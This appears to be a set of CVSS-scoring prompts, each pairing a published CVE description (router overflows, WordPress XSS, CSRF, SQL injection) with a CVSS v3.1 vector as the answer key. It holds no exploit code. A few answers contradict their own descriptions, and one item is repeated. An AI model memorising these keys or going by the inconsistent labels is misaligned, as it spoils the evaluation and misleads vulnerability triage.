Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the adv.iptv.stballvlans parameter in the function formSetIptv. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The POST SMTP Mailer WordPress plugin before 2.8.7 does not properly sanitise and escape several parameters before using them in SQL statements, leading to a SQL injection exploitable by high privilege users such as admin. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Request Forgery vulnerability in flusity-CMS v.2.33 allows a remote attacker to execute arbitrary code via the delete_post .php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, has been found in 个人开源 mldong 1.0. This issue affects the function ExpressionEngine of the file com/mldong/modules/wf/engine/model/DecisionModel.java. The manipulation leads to code injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251561 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A buffer copy without checking size of input vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow authenticated administrators to execute code via a network.  We have already fixed the vulnerability in the following versions: QTS 5.1.2.2533 build 20230926 and later QuTS hero h5.1.2.2534 build 20230927 and later QuTScloud c5.1.5.2651 and later 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: FPE in paddle.topk in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: httparty before 0.21.0 is vulnerable to an assumed-immutable web parameter vulnerability. A remote and unauthenticated attacker can provide a crafted filename parameter during multipart/form-data uploads which could result in attacker controlled filenames being written. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Maximo Asset Management 7.6.1.3 could allow a remote attacker to log into the admin panel due to improper access controls.  IBM X-Force ID:  255073. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: SQL injection vulnerability in adv radius v.2.2.5 allows a local attacker to execute arbitrary code via a crafted script. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Missing Authorization vulnerability in Zorem Sales Report Email for WooCommerce.This issue affects Sales Report Email for WooCommerce: from n/a through 2.8. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The hiWeb Migration Simple WordPress plugin through 2.0.0.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high-privilege users such as admins. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: FPE in paddle.lerp in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: SQL Injection vulnerability in Quest Analytics LLC IQCRM v.2023.9.5 allows a remote attacker to execute arbitrary code via a crafted request to the Common.svc WSDL page. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Security Verify Access 10.0.6 could disclose sensitive snapshot information due to missing encryption.  IBM X-Force ID:  281607. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Community by PeepSo WordPress plugin before 6.3.1.2 does not have CSRF check when creating a user post (visible on their wall in their profile page), which could allow attackers to make logged in users perform such action via a CSRF attack 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Preshared Phrase parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WPdevelop / Oplugins WP Booking Calendar allows Stored XSS.This issue affects WP Booking Calendar: from n/a before 9.7.4. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in code-projects Fighting Cock Information System 1.0. It has been classified as critical. This affects an unknown part of the file /admin/action/new-feed.php. The manipulation of the argument type_feed leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250593 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In video decoder, there is a possible out of bounds read due to improper input validation. This could lead to local denial of service with no additional execution privileges needed 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: QStar Archive Solutions Release RELEASE_3-0 Build 7 Patch 0 was discovered to contain a DOM Based reflected XSS vulnerability within the component qnme-ajax?method=tree_table. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A Cross-Frame Scripting vulnerability has been found on Plone CMS affecting verssion below 6.0.5. An attacker could store a malicious URL to be opened by an administrator and execute a malicios iframe element. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Multiple integer overflow vulnerabilities exist in the VZT vzt_rd_block_vch_decode times parsing functionality of GTKWave 3.3.115. A specially crafted .vzt file can lead to memory corruption. A victim would need to open a malicious file to trigger these vulnerabilities.This vulnerability concerns the integer overflow when num_time_ticks is not zero. 	CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Reflected cross-site scripting (XSS) vulnerabilities in Trend Micro Mobile Security (Enterprise) could allow an exploit against an authenticated victim that visits a malicious link provided by an attacker.  Please note, this vulnerability is similar to, but not identical to, CVE-2023-41178. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Totolink N200RE V5 9.3.5u.6255_B20211224. It has been classified as problematic. Affected is an unknown function of the file /cgi-bin/cstecgi.cgi. The manipulation leads to session expiration. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. VDB-252186 is the identifier assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Elementor Addons by Livemesh plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's widget URL parameters in all versions up to, and including, 8.3.1 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers with contributor access or higher to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Due to a failure in validating the number of scanline samples of a OpenEXR file containing deep scanline data, Academy Software Foundation OpenEX image parsing library version 3.2.1 and prior is susceptible to a heap-based buffer overflow vulnerability. This issue was resolved as of versions v3.2.2 and v3.1.12 of the affected library. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in Doofinder Doofinder WP & WooCommerce Search.This issue affects Doofinder WP & WooCommerce Search: from n/a through 2.0.33. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Command injection in the ping utility on Buffalo LS210D 1.78-0.03 allows a remote authenticated attacker to inject arbitrary commands onto the NAS as root. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Totolink LR1200GB 9.1.0u.6619_B20230130. It has been rated as critical. This issue affects the function setLanguageCfg of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument lang leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250793 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: There is an unsafe DLL loading vulnerability in ZTE ZXCLOUD iRAI. Due to the  program  failed to adequately validate the user's input, an attacker could exploit this vulnerability  to escalate local privileges. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A buffer copy without checking size of input vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow authenticated administrators to execute code via a network.  We have already fixed the vulnerability in the following versions: QTS 5.1.2.2533 build 20230926 and later QuTS hero h5.1.2.2534 build 20230927 and later QuTScloud c5.1.5.2651 and later 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in PeepSo Community by PeepSo – Social Network, Membership, Registration, User Profiles allows Stored XSS.This issue affects Community by PeepSo – Social Network, Membership, Registration, User Profiles: from n/a before 6.3.1.0. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been found in iSharer and upRedSun File Sharing Wizard up to 1.5.0 and classified as problematic. This vulnerability affects unknown code of the component GET Request Handler. The manipulation leads to denial of service. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-250438 is the identifier assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue in the cp_bbs_sig function in relic/src/cp/relic_cp_bbs.c of Relic relic-toolkit 0.6.0 allows a remote attacker to obtain sensitive information and escalate privileges via the cp_bbs_sig function. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Aria Operations for Networks contains a cross site scripting vulnerability. A malicious actor with admin privileges may be able to inject malicious code into user profile configurations due to improper input sanitization. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The simple sort&search WordPress plugin through 0.0.3 does not make sure that the indexurl parameter of the shortcodes "category_sims", "order_sims", "orderby_sims", "period_sims", and "tag_sims" use allowed URL protocols, which can lead to stored cross-site scripting by users with a role as low as Contributor 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Multiple vulnerabilities in Cisco Expressway Series and Cisco TelePresence Video Communication Server (VCS) could allow an unauthenticated, remote attacker to conduct cross-site request forgery (CSRF) attacks that perform arbitrary actions on an affected device.    Note: "Cisco Expressway Series" refers to Cisco Expressway Control (Expressway-C) devices and Cisco Expressway Edge (Expressway-E) devices.   For more information about these vulnerabilities, see the Details ["#details"] section of this advisory. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The WP Go Maps (formerly WP Google Maps) WordPress plugin before 9.0.28 does not properly protect most of its REST API routes, which attackers can abuse to store malicious HTML/Javascript on the site. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in Marios Alexandrou Republish Old Posts.This issue affects Republish Old Posts: from n/a through 1.21. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
